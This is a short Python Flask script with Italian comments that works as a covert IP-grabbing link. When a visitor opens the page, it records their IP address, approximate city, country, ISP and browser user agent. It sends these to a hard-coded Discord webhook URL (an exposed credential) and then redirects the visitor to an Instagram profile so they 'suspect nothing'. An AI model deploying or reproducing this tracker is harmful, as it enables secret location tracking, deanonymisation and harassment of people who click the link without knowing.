from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- CONFIGURAZIONE ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474401525773238393/7scwYZnW0mMNcSgdih7Pw32_YO5jgyKr9GbMjRR15AtVQ9TNC0v1Y7FPY55zTvbIjGMW"
SITO_DI_DESTINAZIONE = "https://www.instagram.com/___lollix___?igsh=dmJwNXFucTlrcmtm" # Dove finisce l'utente dopo il click

@app.route('/')
def logger():
    # 1. Recupera l'IP (gestisce anche i proxy dei server gratuiti)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # 2. Ottieni la posizione (Gratis tramite ipapi.co)
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/").json()
        citta = geo.get("city", "Sconosciuta")
        paese = geo.get("country_name", "Sconosciuto")
        isp = geo.get("org", "Sconosciuto")
    except:
        citta = paese = isp = "Errore API"

    # 3. Prepara il messaggio per Discord
    payload = {
        "embeds": [{
            "title": "🎯 Nuovo IP Catturato!",
            "color": 15158332, # Rosso
            "fields": [
                {"name": "🌐 Indirizzo IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Posizione", "value": f"{citta}, {paese}", "inline": True},
                {"name": "🏢 Provider (ISP)", "value": isp, "inline": False},
                {"name": "📱 Dispositivo", "value": request.user_agent.string, "inline": False}
            ]
        }]
    }

    # 4. Invia i dati a Discord
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

    # 5. Reindirizza l'utente così non sospetta nulla
    return redirect(SITO_DI_DESTINAZIONE)

if __name__ == "__main__":
    app.run(port=5000)